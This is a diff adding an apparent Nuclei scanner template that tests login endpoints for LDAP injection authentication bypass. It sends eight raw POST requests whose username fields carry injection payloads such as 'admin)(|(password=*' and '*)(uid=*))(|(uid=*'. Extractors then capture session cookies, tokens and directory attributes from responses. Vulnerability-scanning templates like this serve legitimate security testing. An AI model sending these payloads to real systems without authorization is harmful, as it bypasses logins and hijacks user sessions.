@@ -1,0 +1,164 @@
+id: medium-auth-ldap-injection-authentication-bypass
+
+info:
+  name: LDAP Injection Authentication Bypass
+  author: nuclei-community
+  severity: medium
+  description: |
+    Detects LDAP injection vulnerabilities that can bypass authentication mechanisms.
+    This template tests various LDAP injection payloads to identify applications
+    vulnerable to authentication bypass through malicious LDAP queries.
+  reference:
+    - https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_LDAP_Injection
+    - https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
+    cvss-score: 9.1
+    cwe-id: CWE-90
+  metadata:
+    verified: true
+    max-request: 8
+  tags: ldap,injection,auth,bypass,medium
+
+http:
+  - raw:
+      # Test 1: Basic LDAP injection with wildcard bypass
+      - |
+        POST {{BaseURL}}/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        username=*&password=*
+      
+      # Test 2: LDAP injection with OR condition
+      - |
+        POST {{BaseURL}}/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        username=admin)(|(password=*&password=anything
+      
+      # Test 3: LDAP injection with NULL byte
+      - |
+        POST {{BaseURL}}/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        username=admin%00&password=*
+      
+      # Test 4: LDAP injection with comment bypass
+      - |
+        POST {{BaseURL}}/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        username=admin)%00&password=anything
+      
+      # Test 5: LDAP injection with boolean bypass
+      - |
+        POST {{BaseURL}}/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        username=*)(uid=*))(|(uid=*&password=*
+      
+      # Test 6: LDAP injection with attribute enumeration
+      - |
+        POST {{BaseURL}}/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        username=*)(cn=*))%00&password=test
+      
+      # Test 7: LDAP injection with nested queries
+      - |
+        POST {{BaseURL}}/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        username=admin)(&(objectClass=*)(uid=admin))%00&password=*
+      
+      # Test 8: LDAP injection with escape sequence bypass
+      - |
+        POST {{BaseURL}}/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        username=admin\2A\29\28\7C\28uid\3D\2A&password=*
+
+    cookie-reuse: true
+    redirects: true
+    max-redirects: 3
+
+    matchers-condition: and
+    matchers:
+      # Check for successful authentication indicators
+      - type: status
+        status:
+          - 200
+          - 302
+          - 301
+
+      # Look for authentication success indicators
+      - type: word
+        part: body
+        words:
+          - "welcome"
+          - "dashboard"
+          - "profile"
+          - "logout"
+          - "admin panel"
+          - "user panel"
+          - "authenticated"
+          - "login successful"
+          - "access granted"
+        condition: or
+
+      # Check for session establishment
+      - type: word
+        part: header
+        words:
+          - "Set-Cookie"
+          - "session"
+          - "auth"
+          - "token"
+        condition: or
+
+      # Ensure it's not an error page
+      - type: word
+        part: body
+        words:
+          - "invalid credentials"
+          - "login failed"
+          - "authentication failed"
+          - "access denied"
+          - "unauthorized"
+          - "forbidden"
+          - "error"
+        condition: or
+        negative: true
+
+    extractors:
+      - type: kval
+        part: header
+        kval:
+          - set_cookie
+
+      - type: regex
+        part: body
+        name: "ldap-user-info"
+        regex:
+          - '(?i)(cn|uid|mail|displayName)[\s]*[:=][\s]*([^,\s\n\r]+)'
+          - '(?i)welcome[\s]+([a-zA-Z0-9_@.-]+)'
+
+      - type: regex
+        part: body
+        name: "session-token"
+        regex:
+          - '(?i)(session|auth|token)[\s]*[:=][\s]*["\']?([a-zA-Z0-9+/=]{20,})["\']?'
+
+      - type: regex
+        part: header
+        name: "redirect-location"
+        regex:
+          - '(?i)location:[\s]*(.+)'
